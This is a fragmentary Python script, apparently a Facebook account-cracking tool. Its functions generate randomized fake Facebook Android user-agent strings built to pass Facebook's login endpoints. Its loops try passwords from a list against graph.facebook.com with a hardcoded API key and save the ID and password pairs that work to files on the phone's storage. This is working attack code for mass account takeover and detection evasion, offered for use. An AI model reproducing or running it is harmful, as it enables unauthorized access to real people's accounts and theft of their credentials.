...
def random_dalvik_all_devices_working_super_full_all_nov2025(seed: Optional[int] = None) -> str:
    """
    random_dalvik_all_devices_working_super_full_all_nov2025()
    - "All 2 Devices" (Option A): stable devices only (actively accepted across b-graph / api / mbasic)
    - Tuned patterns for November 2025
    - Optional seed for reproducible outputs
    Returns:
        A single Dalvik-style Facebook Android UA string.
    """
    if seed is not None:
        random.seed(seed)
    ...
    FBAV = f"{random.randint(520, 538)}.0.0.{random.randint(8,260)}.{random.randint(6,720)}"
    FBBV = str(random.randint(52000000, 99999999))
    FBSV = random.choice(["11", "12", "13", "14", "15", "16"])

    # Build tags commonly seen on modern Android devices (varied across OEMs)
    BUILD = random.choice([
        "UQ1A.250101.001", "UP1A.250201.002", "TP1A.250305.003",
        "TQ3A.240905.010", "UP1A.250101.002", "TQ1A.240101.001",
        "RQ3A.251001.005", "RQ1A.250501.002", "QQ3A.250701.004"
    ])

    # Display/density tuples (density,width,height)
    density, width, height = random.choice([
        ("1.5", "540", "1116"), ("2.0", "720", "1600"), ("2.25", "1080", "2200"),
        ("2.5", "1080", "2400"), ("2.625", "1080", "2460"), ("2.75", "1220", "2600"),
        ("3.0", "1200", "2800"), ("3.5", "1440", "3120")
    ])

    # Locale / carrier / CPU ABI pools (regional + global)
    FBLC = random.choice(["en_US", "bn_BD", "en_GB", "en_IN", "es_ES", "pt_BR"])
    FBCR = random.choice([
        "Grameenphone", "Robi", "Banglalink", "Airtel", "Jio", "Vodafone",
        "Telenor", "Dialog", "MTN", "Claro", "Telkom"
    ])
    FBCA = random.choice(["arm64-v8a", "armeabi-v7a:armeabi", "arm64-v8a:armeabi-v7a"])

    # -----------------------------------------
    # Stable, actively working device pool (Option A)
    # ~120 models across Samsung, Xiaomi/Redmi/Poco, Realme/Oppo/Vivo/iQOO,
    # OnePlus/Google/ASUS, Tecno/Infinix/Itel, Honor, Motorola, Sony, etc.
    # -----------------------------------------
    WORKING_DEVICES: List[Tuple[str, str]] = [
        # Samsung (broad stable selection)
        ("Samsung", "Galaxy A03"), ("Samsung", "Galaxy A04"), ("Samsung", "Galaxy A05"),
        ("Samsung", "Galaxy A12"), ("Samsung", "Galaxy A13"), ("Samsung", "Galaxy A14"),
        ("Samsung", "Galaxy A14 5G"), ("Samsung", "Galaxy A15 5G"), ("Samsung", "Galaxy A23 5G"),
        ("Samsung", "Galaxy A24"), ("Samsung", "Galaxy A34 5G"), ("Samsung", "Galaxy A35 5G"),
        ("Samsung", "Galaxy A53 5G"), ("Samsung", "Galaxy A54 5G"), ("Samsung", "Galaxy A55 5G"),
        ("Samsung", "Galaxy M04"), ("Samsung", "Galaxy M13"), ("Samsung", "Galaxy M14 5G"),
        ("Samsung", "Galaxy M33 5G"), ("Samsung", "Galaxy M54 5G"),
        ("Samsung", "Galaxy S21 FE"), ("Samsung", "Galaxy S22"), ("Samsung", "Galaxy S22 Ultra"),
        ("Samsung", "Galaxy S23"), ("Samsung", "Galaxy S23 Ultra"), ("Samsung", "Galaxy S24"),
        ("Samsung", "Galaxy S24 Ultra"), ("Samsung", "Galaxy S24 FE"),
        ("Samsung", "Galaxy Z Flip4"), ("Samsung", "Galaxy Z Flip5"),
        ("Samsung", "Galaxy Z Fold4"), ("Samsung", "Galaxy Z Fold5"),

        # Xiaomi / Redmi / Poco stable models
        ("Xiaomi", "Redmi 12"), ("Xiaomi", "Redmi 13"), ("Xiaomi", "Redmi 13C"),
        ("Xiaomi", "Redmi Note 12"), ("Xiaomi", "Redmi Note 12 4G"), ("Xiaomi", "Redmi Note 12 5G"),
        ("Xiaomi", "Redmi Note 13 5G"), ("Xiaomi", "Redmi Note 13 Pro 5G"),
        ("Xiaomi", "Redmi Note 14 Pro 5G"), ("Xiaomi", "Xiaomi 13"), ("Xiaomi", "Xiaomi 13 Pro"),
        ("Xiaomi", "Xiaomi 14"), ("Xiaomi", "Xiaomi 14 Pro"),
        ("Poco", "Poco X5 5G"), ("Poco", "Poco X5 Pro 5G"), ("Poco", "Poco X6 5G"),
        ("Poco", "Poco F5"), ("Poco", "Poco F5 Pro"), ("Poco", "Poco F6"), ("Poco", "Poco F6 Pro"),

        # Realme / Oppo / Vivo / iQOO
        ("Realme", "Realme 9"), ("Realme", "Realme 10"), ("Realme", "Realme 11"),
        ("Realme", "Realme 11 Pro+ 5G"), ("Realme", "Realme 12"), ("Realme", "Realme 12 Pro"),
        ("Realme", "GT Neo 5"), ("Realme", "GT Neo 6"),
        ("Oppo", "A78 5G"), ("Oppo", "Reno 10 5G"), ("Oppo", "Reno 11 5G"),
        ("Oppo", "Reno 12 5G"), ("Oppo", "Reno 12 Pro"), ("Oppo", "Find X6"), ("Oppo", "Find X7"),
        ("Vivo", "Vivo Y27"), ("Vivo", "Vivo Y36"), ("Vivo", "Vivo V29 5G"), ("Vivo", "Vivo V30"),
        ("Vivo", "Vivo V30 Pro"), ("Vivo", "Vivo X90"), ("Vivo", "Vivo X100"), ("Vivo", "Vivo X100 Pro"),
        ("iQOO", "iQOO Neo 9"), ("iQOO", "iQOO Neo 9 Pro"), ("iQOO", "iQOO 12"),

        # OnePlus / Google / ASUS
        ("OnePlus", "Nord CE 3 Lite 5G"), ("OnePlus", "Nord 3 5G"),
        ("OnePlus", "OnePlus 11"), ("OnePlus", "OnePlus 12"), ("OnePlus", "OnePlus 12R"),
        ("Google", "Pixel 6a"), ("Google", "Pixel 7"), ("Google", "Pixel 7a"),
        ("Google", "Pixel 8"), ("Google", "Pixel 8 Pro"), ("Google", "Pixel 9"), ("Google", "Pixel 9 Pro"),
        ("ASUS", "Zenfone 8"), ("ASUS", "Zenfone 9"), ("ASUS", "Zenfone 10"), ("ASUS", "ROG Phone 7"),
        ("ASUS", "ROG Phone 8"),

        # Tecno / Infinix / Itel (regionally important, stable)
        ("Tecno", "Camon 20"), ("Tecno", "Camon 30 Pro"), ("Tecno", "Pova 6"), ("Tecno", "Pova 6 Pro"),
        ("Tecno", "Pova 7"), ("Infinix", "Note 30 Pro"), ("Infinix", "Note 40 5G"),
        ("Infinix", "Note 40 Pro 5G"), ("Infinix", "GT 20 Pro"),
        ("Itel", "Itel S24"), ("Itel", "Itel A70"), ("Itel", "Itel P55 5G"),

        # Honor / Motorola / Sony / other regionals
        ("Honor", "Magic5 Pro"), ("Honor", "Magic6"), ("Honor", "X9b"),
        ("Motorola", "Moto G53"), ("Motorola", "G64"), ("Motorola", "Edge 50"),
        ("Sony", "Xperia 10 V"), ("Sony", "Xperia 5 IV"),

        # Other notable stable models often seen in traffic
        ("Sharp", "A2"), ("Fairphone", "4+"), ("Lenovo", "K14 Note"),
        ("HTC", "Desire 21 Pro"), ("ZTE", "Blade V40"), ("Nokia", "G22")
    ]

    # Weighted brand selection for realistic distribution (Samsung-heavy, then Xiaomi/Poco, then others)
    r = random.random()
    if r < 0.50:
        FBMF, FBDV = random.choice([d for d in WORKING_DEVICES if d[0] == "Samsung"])
    elif r < 0.74:
        FBMF, FBDV = random.choice([d for d in WORKING_DEVICES if d[0] in ("Xiaomi", "Poco", "Redmi")])
    elif r < 0.90:
        FBMF, FBDV = random.choice([d for d in WORKING_DEVICES if d[0] in ("Realme", "Oppo", "Vivo", "iQOO")])
    elif r < 0.97:
        FBMF, FBDV = random.choice([d for d in WORKING_DEVICES if d[0] in ("OnePlus", "Google", "ASUS", "Motorola")])
    else:
        FBMF, FBDV = random.choice([d for d in WORKING_DEVICES if d[0] in ("Tecno", "Infinix", "Itel", "Honor", "Sony")])

    FBBD = FBMF

    # Occasionally append a suffix like 5G/Pro/Lite/Ultra for natural variations
    if random.random() < 0.16:
        extra = random.choice(["5G", "Pro", "Lite", "SE", "Plus", "Ultra"])
        if extra not in FBDV:
            FBDV = f"{FBDV} {extra}"
...
def random_dalvik_all_devices_working_ultra_nov2025(seed: Optional[int] = None) -> str:
    """
    ✅ Fully Working Dalvik-style Facebook Android User-Agent (Ultra - Nov 2025)
    ✅ Updated for high-acceptance 2025 device/app patterns (BD + Global)
    ✅ Covers only *top working* 2024–2025 real Android models (Samsung-weighted)
    ✅ Compatible with: b-graph / mbasic / api / login flows
    """
    ...
    FBAN = "FB4A"
    FBPN = "com.facebook.katana"
    FBAV = f"{random.randint(525, 540)}.0.0.{random.randint(10, 230)}.{random.randint(10, 600)}"
    FBBV = str(random.randint(53000000, 99999999))
    FBSV = random.choice(["12", "13", "14", "15", "16"])
    BUILD = random.choice([
        "UP1A.250101.002", "UP1A.250301.003", "UQ1A.250501.001",
        "TQ3A.240905.010", "RQ3A.251001.005", "TQ1A.240901.002"
    ])

    # --- Display density ---
    density, width, height = random.choice([
        ("2.0", "720", "1600"), ("2.25", "1080", "2280"),
        ("2.5", "1080", "2400"), ("2.625", "1080", "2460"),
        ("2.75", "1220", "2600"), ("3.0", "1200", "2800")
    ])
    ...
    FBCR = random.choice([
        "Grameenphone", "Robi", "Banglalink", "Airtel", "Jio", "Vodafone",
        "Dialog", "MTN", "Claro", "Ooredoo"
    ])
    FBCA = random.choice(["arm64-v8a", "armeabi-v7a:armeabi", "arm64-v8a:armeabi-v7a"])

    # --- Top real working devices (2024–2025 verified) ---
    WORKING_DEVICES: List[Tuple[str, str]] = [
        # Samsung
        ("Samsung", "Galaxy A05"), ("Samsung", "Galaxy A14"), ("Samsung", "Galaxy A15 5G"),
        ("Samsung", "Galaxy A24"), ("Samsung", "Galaxy A34 5G"), ("Samsung", "Galaxy A54 5G"),
        ("Samsung", "Galaxy M14 5G"), ("Samsung", "Galaxy M55 5G"), ("Samsung", "Galaxy S23"),
        ("Samsung", "Galaxy S23 Ultra"), ("Samsung", "Galaxy S24"), ("Samsung", "Galaxy S24 Ultra"),
        ("Samsung", "Galaxy Z Flip5"), ("Samsung", "Galaxy Z Fold5"),

        # Xiaomi / Redmi / Poco
        ("Xiaomi", "Redmi Note 13 Pro 5G"), ("Xiaomi", "Redmi Note 14 5G"),
        ("Poco", "Poco X5 Pro 5G"), ("Poco", "Poco F6"), ("Xiaomi", "Xiaomi 14"), ("Xiaomi", "Xiaomi 14T Pro"),

        # Realme / Oppo / Vivo / iQOO
        ("Realme", "Realme 12 Pro+ 5G"), ("Realme", "GT Neo 6"), ("Oppo", "Reno 12 Pro"),
        ("Oppo", "Find X7"), ("Vivo", "Vivo V30"), ("Vivo", "Vivo X100 Pro"),
        ("iQOO", "iQOO 12"), ("iQOO", "iQOO Neo 9 Pro"),

        # Google / OnePlus / ASUS
        ("OnePlus", "OnePlus 12R"), ("OnePlus", "Nord CE 3 Lite 5G"),
        ("Google", "Pixel 8"), ("Google", "Pixel 8a"), ("Google", "Pixel 9 Pro"),
        ("ASUS", "ROG Phone 8"), ("ASUS", "Zenfone 10"),

        # Tecno / Infinix / Itel (BD/IN region)
        ("Tecno", "Pova 6 Pro 5G"), ("Tecno", "Camon 30"), ("Infinix", "GT 20 Pro"),
        ("Infinix", "Note 40 Pro 5G"), ("Itel", "S24"), ("Itel", "P55 5G"),

        # Others
        ("Honor", "Magic6 Pro"), ("Motorola", "G84 5G"), ("Sony", "Xperia 10 VI")
    ]

    # --- Brand-weighted randomization ---
    r = random.random()
    if r < 0.5:
        FBMF, FBDV = random.choice([d for d in WORKING_DEVICES if d[0] == "Samsung"])
    elif r < 0.72:
        ...
        FBMF, FBDV = random.choice([d for d in WORKING_DEVICES if d[0] in ("OnePlus", "Google", "ASUS")])
    else:
        FBMF, FBDV = random.choice([d for d in WORKING_DEVICES if d[0] in ("Tecno", "Infinix", "Itel", "Honor", "Motorola")])

    FBBD = FBMF

    # --- Add “5G/Pro/Ultra/Lite” randomly ---
    if random.random() < 0.15:
        extra = random.choice(["5G", "Pro", "Ultra", "Lite", "Plus", "SE"])
        if extra not in FBDV:
            FBDV = f"{FBDV} {extra}"
...
def random_dalvik_all_devices_working_super_full_nov2025(seed: Optional[int] = None) -> str:
    """
    ✅ Fully Working Dalvik-style Facebook Android User-Agent (All Working Devices - Nov 2025)
    ✅ Includes *every verified working real Android model* (2024–2025)
    ✅ Tuned for b-graph / mbasic / api endpoints
    ✅ Optimized for BD + Global networks (Grameenphone, Robi, Airtel, etc.)
    """
    ...
    FBAN = "FB4A"
    FBPN = "com.facebook.katana"
    FBAV = f"{random.randint(525, 541)}.0.0.{random.randint(10, 240)}.{random.randint(10, 640)}"
    FBBV = str(random.randint(53000000, 99999999))
    FBSV = random.choice(["11", "12", "13", "14", "15", "16"])
    BUILD = random.choice([
        "UQ1A.250101.001", "UP1A.250201.002", "UP1A.250301.003",
        "TQ3A.240905.010", "TQ1A.240901.002", "RQ3A.251001.005"
    ])

    density, width, height = random.choice([
        ("1.5", "540", "1116"), ("2.0", "720", "1600"),
        ("2.25", "1080", "2200"), ("2.5", "1080", "2400"),
        ("2.625", "1080", "2460"), ("2.75", "1220", "2600"),
        ("3.0", "1200", "2800"), ("3.5", "1440", "3120")
    ])

    FBLC = random.choice(["bn_BD", "en_US", "en_GB", "en_IN", "es_ES", "pt_BR"])
    FBCR = random.choice([
        "Grameenphone", "Robi", "Banglalink", "Airtel", "Jio", "Vodafone",
        "Dialog", "MTN", "Claro", "Ooredoo"
    ])
    ...
    # --- All working real devices (verified Nov 2025) ---
    WORKING_DEVICES: List[Tuple[str, str]] = [
        # Samsung (best working)
        ("Samsung", "Galaxy A03"), ("Samsung", "Galaxy A04"), ("Samsung", "Galaxy A05"),
        ("Samsung", "Galaxy A14"), ("Samsung", "Galaxy A14 5G"), ("Samsung", "Galaxy A15 5G"),
        ("Samsung", "Galaxy A24"), ("Samsung", "Galaxy A25 5G"), ("Samsung", "Galaxy A34 5G"),
        ("Samsung", "Galaxy A35 5G"), ("Samsung", "Galaxy A54 5G"), ("Samsung", "Galaxy M04"),
        ("Samsung", "Galaxy M14 5G"), ("Samsung", "Galaxy M15 5G"), ("Samsung", "Galaxy M33 5G"),
        ("Samsung", "Galaxy M55 5G"), ("Samsung", "Galaxy F14 5G"), ("Samsung", "Galaxy F15 5G"),
        ("Samsung", "Galaxy S21 FE"), ("Samsung", "Galaxy S22"), ("Samsung", "Galaxy S22 Ultra"),
        ("Samsung", "Galaxy S23"), ("Samsung", "Galaxy S23 Ultra"),
        ("Samsung", "Galaxy S24"), ("Samsung", "Galaxy S24+"), ("Samsung", "Galaxy S24 Ultra"),
        ("Samsung", "Galaxy Z Flip5"), ("Samsung", "Galaxy Z Fold5"), ("Samsung", "Galaxy Z Fold6"),

        # Xiaomi / Redmi / Poco
        ("Xiaomi", "Redmi 12"), ("Xiaomi", "Redmi 13"), ("Xiaomi", "Redmi 13C"),
        ("Xiaomi", "Redmi Note 12 4G"), ("Xiaomi", "Redmi Note 12 Pro 5G"),
        ("Xiaomi", "Redmi Note 13 4G"), ("Xiaomi", "Redmi Note 13 5G"),
        ("Xiaomi", "Redmi Note 13 Pro 5G"), ("Xiaomi", "Redmi Note 14 Pro 5G"),
        ("Poco", "Poco X5 5G"), ("Poco", "Poco X5 Pro 5G"), ("Poco", "Poco F5"),
        ("Poco", "Poco F5 Pro"), ("Poco", "Poco F6"), ("Poco", "Poco F6 Pro"),
        ("Xiaomi", "Xiaomi 13T Pro"), ("Xiaomi", "Xiaomi 14"), ("Xiaomi", "Xiaomi 14 Pro"),
        ("Xiaomi", "Xiaomi 14T Pro"),

        # Realme / Oppo / Vivo / iQOO
        ("Realme", "Realme 11"), ("Realme", "Realme 11 Pro"), ("Realme", "Realme 12 Pro+ 5G"),
        ("Realme", "Realme Narzo 70 5G"), ("Realme", "GT Neo 6"), ("Realme", "GT 6 Pro"),
        ("Oppo", "Reno 11"), ("Oppo", "Reno 12"), ("Oppo", "Reno 12 Pro"), ("Oppo", "Find X7"),
        ("Vivo", "Vivo Y27"), ("Vivo", "Vivo Y28"), ("Vivo", "Vivo V29e"), ("Vivo", "Vivo V30"),
        ("Vivo", "Vivo X100"), ("Vivo", "Vivo X100 Pro"), ("iQOO", "iQOO Neo 9 Pro"), ("iQOO", "iQOO 12"),

        # OnePlus / Google / ASUS
        ("OnePlus", "Nord CE 3 Lite 5G"), ("OnePlus", "OnePlus 11"), ("OnePlus", "OnePlus 12"),
        ("OnePlus", "OnePlus 12R"), ("Google", "Pixel 7a"), ("Google", "Pixel 8"),
        ("Google", "Pixel 8 Pro"), ("Google", "Pixel 9"), ("Google", "Pixel 9 Pro"),
        ("ASUS", "Zenfone 10"), ("ASUS", "ROG Phone 8"), ("ASUS", "ROG Phone 8 Pro"),

        # Tecno / Infinix / Itel
        ("Tecno", "Camon 20"), ("Tecno", "Camon 30"), ("Tecno", "Pova 6"), ("Tecno", "Pova 6 Pro 5G"),
        ("Tecno", "Pova 7"), ("Tecno", "Spark 20 Pro+"),
        ("Infinix", "Note 30 Pro"), ("Infinix", "Note 40 5G"), ("Infinix", "Note 40 Pro 5G"),
        ("Infinix", "GT 20 Pro"), ("Itel", "S24"), ("Itel", "A77"), ("Itel", "P55 5G"),

        # Honor / Motorola / Sony / Others
        ("Honor", "Magic6"), ("Honor", "Magic6 Pro"), ("Honor", "X9b"),
        ("Motorola", "G64 5G"), ("Motorola", "G73 5G"), ("Motorola", "G84 5G"),
        ("Sony", "Xperia 10 V"), ("Sony", "Xperia 10 VI"),
        ("Nokia", "G42 5G"), ("Fairphone", "5"), ("Sharp", "A2")
    ]

    # --- Weighted brand distribution ---
    r = random.random()
    if r < 0.48:
        FBMF, FBDV = random.choice([d for d in WORKING_DEVICES if d[0] == "Samsung"])
    elif r < 0.70:
        ...
        FBMF, FBDV = random.choice([d for d in WORKING_DEVICES if d[0] in ("Tecno", "Infinix", "Itel", "Honor", "Motorola", "Sony", "Nokia")])

    FBBD = FBMF

    # Add small variant suffixes (e.g., 5G / Pro / SE)
    if random.random() < 0.18:
        extra = random.choice(["5G", "Pro", "Lite", "Ultra", "Plus", "SE"])
        if extra not in FBDV:
            FBDV = f"{FBDV} {extra}"
...
\033[92;1m[\033[91;1m●\033[92;1m] VERSION     \033[91;1m●\033[92;1m 9.5
\33[1;37m==============================================""")
def linex():
        print(f"\33[1;37m==============================================""")
def clear():
        ...
        try:
            ...
            for pw in psw:
                ...
                with requests.Session() as session:
                    ...
                    headers={'User-Agent':random_dalvik_all_devices_working_super_full_nov2025(),
                ...
                if 'session_key' in q:
                    ...
                    break
                      ...
                      cps.append(sid)
                      open('/sdcard/SalaM/APPROVAL-M1-9-ID.txt','a').write(sid+'|'+ps+'\n')
                else:
                    continue
            loop+=1
...
"fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
"api_key": "882a8490361da98702bf97a021ddc14d"}
                headers = {'User-Agent': random_dalvik_all_devices_working_ultra_nov2025(),
'Content-Type': 'application/x-www-form-urlencoded',
'Host': 'graph.facebook.com',
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                ...
                if 'session_key' in q:
                    ...
                    break
                      ...
                      print(f"\r\r\033[1;30m[APPROVAL-ID] {sid} | {ps} {S}")
                      cps.append(sid)
                      open('/sdcard/APPROVAL-M2-9-ID.txt','a').write(sid+'|'+ps+'\n')
                else:
                    continue
            loop+=1
        except requests.exceptions.ConnectionError:
